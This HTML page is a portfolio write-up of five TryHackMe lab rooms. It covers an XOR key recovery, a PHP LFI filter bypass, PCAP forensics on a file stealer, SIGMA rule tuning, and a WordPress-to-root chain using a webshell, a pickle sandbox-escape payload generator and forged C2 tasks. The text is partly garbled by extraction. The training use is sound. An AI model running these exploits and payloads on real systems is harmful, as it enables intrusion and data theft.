@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jackpot Series // writeup</title>
+    <meta name="description" content="All three Jackpot rooms in one writeup: logic flaws, crypto tricks and the recon that ties them together into a full compromise.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Jackpot Series</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web / Cryptography</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-08</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Cryptography / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> combined-jackpot-series-writeup.md</span>
+                </div>
+                <p class="writeup-summary">All three Jackpot rooms in one writeup: logic flaws, crypto tricks and the recon that ties them together into a full compromise.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/combined-jackpot-series-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="combined-jackpot-series-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>TryHackMe “Overflow The Jackpot” Series — Combined Writeup</h1>
+<h2>B1t Recovery · Lost Fortune · Casino Heist · Fresh Powder (DaC) · Agent P (EVILINC)</h2>
+<h1>TryHackMe &quot;Overflow The Jackpot&quot; Series — Combined</h1>
+<h3>Covers five challenges solved back-to-back: <strong>B1t Recovery</strong> (crypto, 30 pts), <strong>Lost Fortune</strong> (web, 60 pts), <strong>Casino Heist</strong> (forensics, 90 pts), <strong>Fresh Powder / Detection-as-Code</strong> (blue team, POWDER WOLF room) and <strong>Agent P</strong> (EVILINC boot2root, 120 pts). All flags verified against the THM{...} / EVILINC{...} formats.</h3>
+<h1>Challenge Category Flag 1 B1t Recovery Crypto <code>THM{X0r_K3y_r 3c0verY_H4s_N3 veR_B33n_Th1S_ E@sy}</code> 2 Lost Fortune Web (LFI) <code>THM{wr4pp3rs_ sk1p_th3_wh1t3 l1st}</code> 3 Casino Heist Forensics (PCAP) <code>THM{J@ckP05_R 0bb3ry_VIA_pYt h0nN}</code> 4 Fresh Powder Detection-as-Code 5 flags (see (DaC) section 4) 5 Agent P Boot2Root 3 flags (see section 5)</h1>
+<h3>---</h3>
+<h1>1. B1t Recovery — Crypto (30 pts)</h1>
+<h2>Challenge</h2>
+<h3>An attachment attachment-1785955139202.zip contains challenge.py and encrypted.bin:</h3>
+<p>import os from pwn import * key = os.urandom(4) flag = b&quot;THM{FAKE_FLAG_FOR_TESTING}&quot; # fake fla g, look at encrypted.bin and figure out # the vulnerability in this encryption method. encrypted = xor(flag, key) with open(&quot;encrypted.bin&quot;, &quot;wb&quot;) as f: f.write(encrypted)</p>
+<h3>The &quot;encryption&quot; is a <strong>repeating-key XOR with a 4-byte key</strong>. Since the plaintext must start with THM{, we can recover the whole key with a known-plaintext attack.</h3>
+<h2>Solve</h2>
+<p>ct = open(&#39;encrypted.bin&#39;,&#39;rb&#39;).read() print(&quot;ciphertext len:&quot;, len(ct))          # 46 known = b&quot;THM{&quot; for k in range(4): print(f&quot;key byte {k}: 0x{ct[k]^known[k]:02x}&quot;) page 2</p>
+<p>key = bytes(ct[i] ^known[i] for i in range(4)) print(&quot;key:&quot;, key.hex())                   # cbcece43 pt = bytes(c ^ key[i % len(key)] for i, c in enumerate(ct)) print(&quot;decrypted:&quot;, pt)</p>
+<h3>Output:</h3>
+<p>ciphertext len: 46 key byte 0: 0xcb key byte 1: 0xce key byte 2: 0xce key byte 3: 0x43 key: cbce ce43 decrypted: b&#39;THM{X0r_K3y_r3c0verY_H4s_N3veR_B33n_Th1S_E@sy}&#39;</p>
+<h2>Flag</h2>
+<h3>XOR with a repeating key is only secure if the key is at least as long as the plaintext. The <code>THM{</code> prefix is a guaranteed known-plaintext crib for every TryHackMe flag → key byte <code>i</code> = <code>ct[i] ^ crib[i]</code>. ---</h3>
+<h1>2. Lost Fortune — Web LFI (60 pts)</h1>
+<h2>Target</h2>
+<h3>http://10.48.152.31 — &quot;VILLAGE ARCHIVE TERMINAL v2.3&quot;.</h3>
+<h2>Vulnerability</h2>
+<h3>The app serves documents via ?doc= and applies two independent filters that can be bypassed:</h3>
+<pre class="code-block" data-lang="bash"><code>$doc = isset($_GET[&#39;doc&#39;]) ? $_GET[&#39;doc&#39;] : &#39;&#39;;</code></pre>
+<p>// stage 1: naive single-pass traversal strip</p>
+<pre class="code-block" data-lang="bash"><code>$</code></pre>
+<p>doc = str_replace(&#39;../&#39;, &#39;&#39;, $doc);</p>
+<pre class="code-block" data-lang="bash"><code>$base = __DIR__ . &#39;/village_docs/&#39;;
+$is_wrapper = (strpos($</code></pre>
+<p>doc, &#39;://&#39;) !== false); if (!$is_wrapper) { // stage 2: extension whitelist, only ever appl ied to plain filenames if (stripos($doc, &#39;.pdf&#39;) === false &amp;&amp; stripos($doc, &#39;.png&#39;) === fals e) { http_response_code(403); die(&#39;Only .pdf and .png village documents may be v iewed.&#39;); }</p>
+<pre class="code-block" data-lang="bash"><code>    $path = (isset($doc[0]) &amp;&amp; $doc[0] === &#39;/&#39;) ? $doc : $base . $doc;</code></pre>
+<p>} else { // wrapper protocols were never covered by the whitelist check above</p>
+<pre class="code-block" data-lang="bash"><code>    $path = $doc;</code></pre>
+<p>} rea dfile($path);</p>
+<h3>Three flaws: 1. <strong>Single-pass str_replace(&#39;../&#39;,&#39;&#39;)</strong> → classic ..././ bypass: ....// collapses to ../ after one replacement. 2. The <strong>extension whitelist is skipped entirely for wrapper protocols</strong> (:// present) — php:// streams never hit the .pdf/.png check. 3. An <strong>absolute path</strong> (/...) skips the $base prefix.</h3>
+<h2>Recon of the decoys</h2>
+<h3>village_schedule.pdf and important.png are both decoys (OCR: schedule list + a &quot;hacker meme&quot; image).</h3>
+<h2>Exploit — read <code>/var/www/flag.txt</code> via the wrapper</h2>
+<h3>Since the wrapper bypasses the extension whitelist, the flag file is directly readable:</h3>
+<p>for n in flag.txt flag; do for d in &quot;/var/www/html&quot; &quot;/var/www&quot;; do sz=$(curl -s -m 5 -o r. out -w &quot;%{size_download}&quot; \ &quot;http://10.48.152.31/?doc=php://filter/read=convert.base64-enc ode/resource=$d/$n&quot;) if [ &quot;$sz&quot; != &quot;0&quot; ]; then echo &quot;HIT $d/$n size=$sz: $(base64 -d r.out)&quot; ; fi done done</p>
+<h3>Output:</h3>
+<p>HIT /var/www/flag.txt size=44: THM{wr4pp3rs_sk1p_th3_wh1t3l1st}</p>
+<h2>Flag</h2>
+<h3><code>php://filter</code> wrappers bypass naive extension checks — the whitelist was only applied to the non-wrapper branch. If <code>../</code> stripping is single-pass, <code>....//</code> survives as <code>../</code>. <code>base64-encode</code> wrapper avoids binary/encoding mangling when reading arbitrary files. ---</h3>
+<h1>3. Casino Heist — Forensics / PCAP (90 pts)</h1>
+<h2>Artifact</h2>
+<h3>stolen_jackpot.pcapng (20 MB) — network capture of a casino heist.</h3>
+<h2>Step 1 — Overview</h2>
+<p>tshark -r stolen_jackpot.pcapng -q -z io,phs | head -30 tshark -r stolen_jackpot.pcapng -q -z co nv,tcp | head -20 tshark -r stolen_jackpot.pcapng -q -z endpoints,ip | head -15</p>
+<h3>Key conversations: HTTP traffic against <code>172.20.0.2:8080</code> (the target server) A single TCP conversation to <strong><code>172.20.0.3:4444</code></strong> — the exfil channel</h3>
+<h2>Step 2 — HTTP analysis</h2>
+<p>tshark -r stolen_jackpot.pcapng -Y http -T fields \ -e frame.number -e http.request.method -e http.request.uri \ -e http.response.code -e http.content_type | head -30 tshark -r stolen_jac kpot.pcapng --export-objects http,httpobj file httpobj/stealer</p>
+<h3>Streams 0–3 are GET /admin, /cms, /flag, /stealer on 172.20.0.2:8080 — all 404s — and stream 0 delivers the <strong>stealer executable</strong> (the malware). httpobj/stealer is a PyInstaller bundle; extracted to stealer_extracted/ containing stealer.pyc.</h3>
+<h2>Step 3 — Decompile the stealer</h2>
+<h3>pycdc (from /tmp/opencode/pycdc/pycdc) decompiled stealer.pyc. The logic: Walks <code>/home</code> looking for files ending in <strong><code>.jackpot</code></strong> <strong>AES-CBC</strong> encryption with hardcoded key/IV Exfiltrates <code>filename\nciphertext</code> to <code>172.20.0.3:4444</code> Static strings found in the .pyc:</h3>
+<p>AES) pads J4ckp0tH4ck3rKey Iv_For_Exf1ltr8! 172.20.0.3 /home .jackpot socket gethostname walk en dswith open read MODE_CBC encrypt connect HOST PORT sendall encode root files data stealer.py</p>
+<h3>Key material: <code>KEY = b&#39;J4ckp0tH4ck3rKey&#39;</code> <code>IV = b&#39;Iv_For_Exf1ltr8!&#39;</code> <code>HOST = 172.20.0.3</code>, <code>PORT = 4444</code></h3>
+<h2>Step 4 — Extract the exfil payload</h2>
+<p>tshark -r stolen_jackpot.pcapng -q -z follow,tcp,ascii,4 | head -60 tshark -r stolen_jackpot.pca png -q -z follow,tcp,ascii,5 | head -40</p>
+<h3>Stream 4 payload (hex):</h3>
+<p>666c61672e6a61636b706f740a 9bcc341f8374f7d031a5a0ee4663501313b15466b184e33a3f295efd0cd1b4f5c64b4 8dd831bbca7ec4423e3782f8fe5</p>
+<h3>i.e. flag.jackpot\n + 48 bytes of AES-CBC ciphertext. Stream 5 is an empty second transfer.</h3>
+<h2>Step 5 — Decrypt</h2>
+<p>from Crypto.Cipher import AES from Crypto.Util.Padding import unpad KEY = b&#39;J4ckp0tH4ck3rKey&#39; I V  = b&#39;Iv_For_Exf1ltr8!&#39; hx = &quot;9bcc341f8374f7d031a5a0ee4663501313b15466b184e33a3f295efd0cd1b4f5 c64b48dd831bbca7ec4423e3782f8fe5&quot; ct = bytes.fromhex(hx) page 5</p>
+<p>pt = AES.new(KEY, AES.MODE_CBC, IV).dec rypt(ct) print(unpad(pt, 16))</p>
+<h3>Output:</h3>
+<p>frame685 -&gt; b&#39;THM{J@ckP05_R0bb3ry_VIA_pYth0nN}&#39;</p>
+<h2>Flag</h2>
+<h3>PyInstaller <code>.pyc</code> files keep constant strings in the clear — <code>strings</code> alone gave key, IV, host, port, extension. <code>tshark -z follow,tcp,ascii,N</code> extracts full stream bytes for the exfil channel. Exfil traffic looks like a normal short TCP transfer — always check conversations to non-HTTP ports. ---</h3>
+<h1>4. Fresh Powder — Detection-as-Code (POWDER WOLF / Cascadia Ski and Resort Collective)</h1>
+<h3>A blue-team room: tune SIGMA-style detection rules for 5 pull requests until they pass the full pipeline (syntax → convert → validate(100%) → redteam), then get each PR approved and merged.</h3>
+<p>PR Detection Key fix Flag PR RDP — EventID 4624, LogonType <code>(10, 7)</code> + <code>THM{Untru5ted 1 untrusted filter internal </code>10.40.<code>/VPN <em>R4nge</em>Bu5ted} source </code>10.90.<code>/MSP </code>198.51.100.<code> sources </code> PR NetScan — EventID 5145 + <code>RelativeTargetName</code> <code>THM{D3l3t3_M3 2 share endswith </code>delete.me<code> (field was wrong: <em>G1v3s</em>1t_4w4y write-test </code>ShareName<code>) }</code> PR AnyDesk — EventID 7045 + <code>ServiceFileName</code> <code>THM{Ban1ked_4 3 service contains ccess_Ch4nnel} persistence AnyDesk/TeamViewer/ScreenConnect/… </code> (not <code>Image</code>), filter legit workstations PR 7-Zip — share <code>OriginalFileName</code> 7zG/7zFM/7z.exe + <code>THM{Z1pp3d_R1 4 archiving UNC </code>\\<code> in CommandLine; WinRAR + ght_0ut_th3_D0 PowerShell </code>Compress-Archive<code>; filter 0r}</code> legit wscript <code>ReservationsExport_</code> monthly job PR Lynx — CommandLine <code>contains all</code> (<code>--dir</code>, <code>THM{C4ught_B 5 ransomware </code>--mode f0re_th3_Th4w deployment fast<code>); filter </code> DiskOptimizer by <code>Image</code> path + <code>Origin alFileName</code></p>
+<h2>Pipeline gotchas (worth remembering)</h2>
+<h3>A plain repeated <code>CommandLine|contains</code> collapses to the last one → use <code>|contains|all</code>. <code>|in</code> modifier is unsupported → use a plain value list (equality OR). Checks run sequentially: syntax → convert → validate → redteam; redteam needs validate to pass first. Redteam tests bypass with alternate logon types (7), other tools, renamed binaries and path collisions — filter by combination of path + <code>OriginalFileName</code>, not one field. ---</h3>
+<h1>5. Agent P — EVILINC Boot2Root (120 pts)</h1>
+<h3>Source: ~/Desktop/AgentP_EVILINC_Walkthrough.pdf (extracted walkthrough of the live engagement).</h3>
+<h2>Overview</h2>
+<h3>Full exploitation of the EVILINC box (Doofenshmirtz Evil Incorporated) at http://10.49.139.112 — WordPress 6.9 on Ubuntu 24.04 (hostname tryhackme-2404, kernel 7.0.0-1010-aws). Path: <strong>unauthenticated WordPress RCE (wp2shell) → read DB creds → SSH as norm (user flag) → read operator secret → restricted-pickle sandbox escape on the &quot;-inator Control Panel&quot; (operator flag) → reverse the root implant&#39;s homegrown crypto → forge a signed C2 task → root flag</strong>. Public services: 22/tcp OpenSSH 9.6p1, 80/tcp Apache 2.4.58. Internal loopback: gunicorn (Flask) on 127.0.0.1:8700 — the &quot;-inator Control Panel&quot;. Unix socket /run/evilinc/tasking.sock — the C2 tasking queue (root + vanessa).</h3>
+<h2>All secrets / key values</h2>
+<p>Item Value WP DB user / pass <code>wpuser</code> / <code>wp_WjURfdI</code> (database: wordpress) WP admin (created by <code>wp2_88ff51b38aa8</code> / <code>Wp2!2dGCLZf3aqnU6B-GBrlO</code> wp2shell) SSH norm <code>norm</code> / <code>N0rm_th3_r0b0t_2026</code> (groups: norm, evilinc) Operator secret <code>b3hind_sch3dul3_th1s_m0nth</code> (panel.conf) Operator token <code>ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9</code> cookie <code>/etc/machine-id</code> <code>ec237b10a5f6e959a3088340f9904b31</code> Implant rodata blob <code>1588c57c026ae5eb9c2d1817af48f70964efff765e58d112d8f116d70f9941b4</code> @0x2020 LCG seed / mul / inc <code>0x1a2b3c4d</code> / <code>0x41c64e6d</code> / <code>0x3039</code>, byte = <code>(x&gt;&gt;16) &amp; 0xff</code> Derived C2 task MAC <code>aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319</code> key</p>
+<h2>Flags</h2>
+<p>Flag Level Location <code>EVILIN User </code>/home/norm/user.txt<code> C{n0rm_ r34ds_t h3_db_l 1k3_4_g 00d_r0b 0t}</code> page 7</p>
+<p><code>EVILIN Operator </code>/home/vanessa/operator.tx C{p1ckl t<code> 3_s4ndb 0x3s_4r 3_n0t_s 4ndb0x3 s}</code> <code>EVILIN Root </code>/root/root.txt<code> C{d00f_ r0ll3d_ h1s_0wn <em>crypt0 </em>4nd_p3 rry_w0n }</code></p>
+<h2>Stage 0 — Foothold recap •</h2>
+<h3>Recon: nmap (22, 80), gobuster, wpscan, REST API enum at <code>/index.php/wp-json/</code>. WordPress 6.9, single user &quot;heinz&quot;, stock twentytwentyfive theme, no plugins, no vhosts. <strong>wp2shell</strong>: CVE-2026-63030 (REST batch-route confusion via <code>///</code>) + CVE-2026-60137 (SQLi in <code>author__not_in</code>) → unauthenticated RCE on WP 6.9.0–6.9.4. Verified: batch probe → HTTP 207 with markers <code>parse_path_failed</code> / <code>block_cannot_read</code> / <code>rest_batch_not_allowed</code>; <code>--confirm-sqli</code> → UNION-based read. Extracted heinz hash: <code>$wp$2y$10$.BrQfOVjT99Dym42SPtG..4JAENmluiY0CXlu/z6EnJMkizaze4ZW</code> <code>wp2shell.py shell</code> created admin <code>wp2_88ff51b38aa8</code> and authenticated the session. Manual plugin upload of &quot;shellplug&quot; webshell → RCE as www-data: Helper used throughout:</h3>
+<p>ws() { curl -s -m 25 &quot;http://10.49.139.112/wp-content/plugins/shellplug/shellplug.php?c=$(python 3 -c &quot;import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))&quot; &quot;$1&quot;)&quot;; }</p>
+<h2>Stage B — WordPress DB → SSH as norm → USER FLAG</h2>
+<p>ws &#39;cat /var/www/html/wp-config.php&#39;   # DB_NAME=wordpress, DB_USER=wpuser, DB_PASSWORD=wp_WjURf dI ws &quot;mysql -uwpuser -pwp_WjURfdI -e &#39;use wordpress; show tables;&#39;&quot; # Tables_in_wordpress: wp_ commentmeta wp_comments wp_infra_accounts wp_links wp_options wp_postmeta # wp_posts wp_term_rel ationships wp_term_taxonomy wp_termmeta wp_terms wp_usermeta wp_users ws &quot;mysql -uwpuser -pwp_W jURfdI -e &#39;use wordpress; describe wp_infra_accounts; select * from wp_infra_accounts;&#39;&quot; # host_ user | host_pass             | note # norm      | N0rm_th3_r0b0t_2026   | ssh sync target for th e -inator newsletter cron</p>
+<h3>SSH as norm (paramiko), then:</h3>
+<pre class="code-block" data-lang="bash"><code>$ id</code></pre>
+<p>uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /etc/evilinc/panel.con</code></pre>
+<pre class="code-block" data-lang="bash"><code>[panel]</code></pre>
+<p>operator_secret = b3hind_sch3dul3_th1s_m0nth</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /home/norm/user.txt</code></pre>
+<p>EVILINC{n0rm_r 34ds_th3_db_l1k3_4_g00d_r0b0t}</p>
+<h2>Stage C — Operator flag (vanessa) via restricted-pickle sandbox escape</h2>
+<h3>The panel runs as vanessa: /usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app (WorkingDirectory /var/www/evilinc-panel). <strong>Login</strong> (sets HMAC token cookie):</h3>
+<p>curl -s -c /tmp/cj.txt -X POST http://127.0.0.1:8700/api/login -d &#39;secret=b3hind_sch3dul3_th1s_m 0nth&#39; # =&gt; {&quot;ok&quot;:true}  + Set-Cookie: op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451 ae6b9f9fefef3f9</p>
+<h3><strong>Endpoints:</strong> <code>POST /api/blueprints/import</code> — field <code>blueprint</code> (base64 pickle); operator-only; uses a LEAKY restricted unpickler <code>GET /api/blueprints/export</code> — sample blueprint (<code>plain pickle.dumps</code> of a dict) <code>GET /</code> — panel index (footer hint: &quot;If a blueprint fails to load, the loader returns the reason. — Vanessa&quot;) <strong>The leaky restricted unpickler.</strong> A bare GLOBAL module\nattr\n. pickle is loaded and repr&#39;d when allowed → module blocklist leaks:</h3>
+<p>ALLOWED: io.BytesIO, io.open, pickle.Unpickler, <em>pickle.load, </em>pickle.Unpickler, functools.par tial/reduce, codecs.encode, <em>codecs.encode, collections.*, copyreg.*, types.FunctionType/CodeT ype/SimpleNamespace, marshal.loads, threading.Thread, json/re/string/urllib.parse/html/time/da tetime/pathlib/ntpath/array/struct/zipfile, base64.b64decode, binascii.unhexlify, weakref.ref, signal.signal, app.app, werkzeug.run</em>simple BLOCKED: builtins, os, posix, subprocess, sys, oper ator, importlib, numpy</p>
+<h3><strong>Escape — nested unrestricted unpickle.</strong> An outer pickle that only uses allowed globals: <em>pickle.load(io.BytesIO(inner)). The inner bytes are a BINBYTES constant (never inspected by the outer loader) and are executed by the plain C load, which permits everything. (Python 3.12/3.13 removed GETATTR, so Unpickler(...).load() chaining is unavailable; </em>pickle.load takes a file object directly.) Payload generator (mkcmd.py):</h3>
+<p>import pickle, struct, base64, sys cmd = sys.argv[1] class R: def <strong>reduce</strong>(self): import subprocess return (subprocess.check_output, ([&#39;bash&#39;, &#39;-c&#39;, cmd],)) inner = pickl e.dumps(R()) s = bytearray(b&#39;\x80\x04&#39;) s += b&#39;c_pickle\nload\n&#39; s += b&#39;cio\nBytesIO\n&#39; s += b&#39;B &#39; + struct.pack(&#39;&lt;I&#39;, len(inner)) + inner s += b&#39;\x85R\x85R.&#39; print(base64.b64encode(bytes(s)).d page 9</p>
+<h3>Send: ws &quot;curl -s -b /tmp/cj.txt -X POST http://127.0.0.1:8700/api/blueprints/import</h3>
+<p>--data-urlencode blueprint=$B64&quot;</p>
+<h3>Response — RCE as vanessa:</h3>
+<p>{&quot;loaded&quot;:&quot;b&#39;uid=1002(vanessa) gid=1003(vanessa) groups=1003(vanessa),1001(evilinc)\\n===...&quot;</p>
+<h3>(Import response reflects repr(obj)[:200]→ output truncated to ~200 chars; long files read in 90-char chunks with tail -c +N | head -c 90.)</h3>
+<pre class="code-block" data-lang="bash"><code>$ ls -a1 /home/vanessa</code></pre>
+<p>. .. .bash_history .bash_logout .bashrc .cache .gunicorn .profile .ssh .v iminfo operator.txt</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /home/vanessa/operator.txt</code></pre>
+<p>EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s }</p>
+<h2>Stage D — Root flag: reverse the implant, forge a signed C2 task</h2>
+<h3>Systemd services reveal the attack surface:</h3>
+<p>evilinc-c2.service:      root  /usr/bin/python3 /opt/evilinc/c2/tasking_server.py  (RuntimeDirec tory=evilinc) evilinc-implant.service: root  /opt/evilinc/implant   (After/Requires evilinc-c2.s ervice, Restart=always) evilinc-heartbeat.service: root /usr/bin/python3 /opt/evilinc/c2/heartbe at.py evilinc-panel.service:    vanessa gunicorn 127.0.0.1:8700  (EIC_PANEL_CONF=/etc/evilinc/pa nel.conf)</p>
+<h3>/run/evilinc/tasking.sock is srw-rw---- root:vanessa — the implant (root) polls it and the C2 (root) answers. vanessa can connect. <strong>Download and reverse the implant:</strong></h3>
+<p>ws &#39;base64 /opt/evilinc/implant&#39; &gt; implant.b64 &amp;&amp; python3 -c &quot;import base64; open(&#39;implant&#39;,&#39;wb&#39; ).write(base64.b64decode(open(&#39;implant.b64&#39;).read().replace(&#39;\n&#39;,&#39;&#39;)))&quot; file implant # ELF 64-b it LSB pie executable, x86-64, dynamically linked, stripped (14472 bytes) strings -n 5 implant | grep -iE &#39;poll|sock|machine|exec|sysinfo|END&#39; # /etc/machine-id   /run/evilinc/tasking.sock POLL %ld\n   END   |%s|%s|%s|%s   exec   sysinfo   %02x</p>
+<h3><strong>Protocol (from objdump -d -M intel):</strong> Main loop: connect to <code>/run/evilinc/tasking.sock</code>, send <code>POLL &lt;last_seen_ts&gt;\n</code>, read response, tokenize lines by <code>\n</code> until the <code>END</code> marker. Each task line: <code>&lt;ts&gt;|&lt;type&gt;|&lt;cmd&gt;|&lt;nonce&gt;|&lt;mac&gt;</code>; ts must be &gt; last_seen; the line is re-assembled as <code>&lt;ts&gt;|&lt;type&gt;|&lt;cmd&gt;|&lt;nonce&gt;</code> and the hex MAC is verified with <code>strcmp</code>. MAC function @0x16d7: HMAC-SHA256(key, message), hex-encoded. If <code>type == &quot;exec&quot;</code> → <code>system(cmd)</code> runs as ROOT. If <code>sysinfo</code> → informational path. Key derivation @0x1602: <code>key = HMAC-SHA256(K, /etc/machine-id)</code> where <code>K = LCG_bytes XOR rodata_blob@0x2020</code>; LCG @0x1449: seed <code>0x1a2b3c4d</code>, <code>x = x*0x41c64e6d + 0x3039 (mod 2^32)</code>, output byte = <code>(x&gt;&gt;16) &amp; 0xff</code>, 32 iterations. <strong>Recover the task MAC key:</strong></h3>
+<p>import hashlib, hmac seed = 0x1a2b3c4d blob = bytes.fromhex(&quot;1588c57c026ae5eb9c2d1817af48f70964e fff765e58d112d8f116d70f9941b4&quot;) x = seed; lcg = bytearray() for i in range(32): x = (x * 0x4 1c64e6d + 0x3039) &amp; 0xffffffff lcg.append((x &gt;&gt; 16) &amp; 0xff) K   = bytes(a ^ b for a, b in zi p(lcg, blob)) KEY = hmac.new(K, b&quot;ec237b10a5f6e959a3088340f9904b31&quot;, hashlib.sha256).digest() pr int(K.hex()) print(KEY.hex()) K   = 4310b28058bce65bdba3a78f86105499694d8b8a105e24967899db58d64a7634 KEY = aa3e4980d20530450df 2e4807cddc7a66f8391b79df9faaacde58b75bb483319</p>
+<h3><strong>Verify the key against live C2 traffic:</strong></h3>
+<p>import socket s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect(&quot;/run/evilinc/tas king.sock&quot;) s.sendall(b&quot;POLL 1\n&quot;); print(s.recv(65536)) # =&gt; b&#39;10|sysinfo|uptime|1000|2b33d3bf9 0540c999ecd917150e514240cc02cef3cd4fece3486790681103718\n #    20|sysinfo|uptime|1001|0f9e75af08 2404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f\n&#39; hmac.new(KEY, b&quot;10|sysinfo|uptime|1000&quot;, hashlib.sha256).hexdigest() # =&gt; 2b33d3bf90540c999ecd91 7150e514240cc02cef3cd4fece3486790681103718  (MATCH) hmac.new(KEY, b&quot;20|sysinfo|uptime|1001&quot;, has hlib.sha256).hexdigest() # =&gt; 0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f (MATCH)</p>
+<h3><strong>Discover the SUBMIT verb</strong> (verb brute): ADD/QUEUE/TASK→ERR unknown verb; SUBMIT→ERR expected id|type|cmd|nonce|sig. <strong>Forge and submit a root task:</strong></h3>
+<p>def sig(msg): return hmac.new(KEY, msg.encode(), hashlib.sha256).hexdigest() task = &quot;99999|exec| id &gt; /tmp/rce_test.txt 2&gt;&amp;1 &amp;&amp; echo ROOT_OK &gt;&gt; /tmp/rce_test.txt|424242&quot; print(&quot;SUBMIT &quot; + task + &quot;|&quot; + sig(task)) # SUBMIT 99999|exec|id &gt; /tmp/rce_test.txt 2&gt;&amp;1 &amp;&amp; echo ROOT_OK &gt;&gt; /tmp/rce_t est.txt|424242|f4bb7b756b4cc5d83033206f6deaf5b72874509e0166cf17f13557f90a49f5ef</p>
+<h3>(First attempt with a small id failed: ERR id must exceed current max — use large ids. Accepted: OK\n; the root implant polls every 3 s and executes the task.)</h3>
+<pre class="code-block" data-lang="bash"><code>$ cat /tmp/rce_test.txt</code></pre>
+<p>uid=0(root) gid=0(root) groups=0(root) ROOT_OK</p>
+<h3><strong>Root flag:</strong></h3>
+<p>SUBMIT 100000|exec|cat /root/root.txt &gt; /tmp/rf.txt &amp;&amp; chmod 644 /tmp/rf.txt|424243|0adfccf9bc4b 73c355dd023ec9d740b8978a0790ffa873de9b5ea274a800e852</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /tmp/rf.txt</code></pre>
+<p>EVILINC{d00f_r0ll3d_h1s_ 0wn_crypt0_4nd_p3rry_w0n}</p>
+<h2>Agent P — key files / artifacts •</h2>
+<h3><code>http://10.49.139.112/wp-content/plugins/shellplug/shellplug.php</code> — webshell (RCE as www-data) <code>/opt/evilinc/implant</code> — stripped ELF implant (root), poller for the tasking socket <code>/opt/evilinc/c2/tasking_server.py</code> — C2 queue server (root) <code>/opt/evilinc/c2/heartbeat.py</code> — root heartbeat service <code>/run/evilinc/tasking.sock</code> — C2 socket, <code>srw-rw---- root:vanessa</code>; verbs: <code>POLL</code>, <code>SUBMIT</code> <code>/var/www/evilinc-panel/</code> — <code>app.py</code> + <code>restricted_unpickler.py</code> (vanessa RCE reads) <code>/etc/evilinc/panel.conf</code> (group evilinc) — <code>operator_secret</code> <code>/etc/evilinc/pepper</code> — 32 bytes, root-only (never needed)</h3>
+<h2>Author-side notes gleaned from the box •</h2>
+<h3><code>wp_infra_accounts</code> note: &quot;ssh sync target for the -inator newsletter cron&quot; → norm&#39;s SSH account is the C2 &quot;sync target&quot;; operator role = vanessa. Panel auth is &quot;deliberately a leaked-secret HMAC token&quot;: <code>operator_token = HMAC-SHA256(secret, &quot;operator&quot;)</code> hex. Implant crypto is homegrown LCG → deterministic key → forgeable tasks (flag pun: <code>d00f_r0ll3d_h1s_0wn_crypt0</code>). ---</h3>
+<h1>Closing</h1>
+<h3>All five rooms completed end-to-end. Thematically they form a neat arc: a 4-byte XOR key, a PHP wrapper whitelist bypass, an exfiltrated AES-CBC flag inside a PCAP, five SIGMA detection rules, and finally a boot2root ending in a forged HMAC-signed C2 task against a homegrown LCG-derived key.</h3>
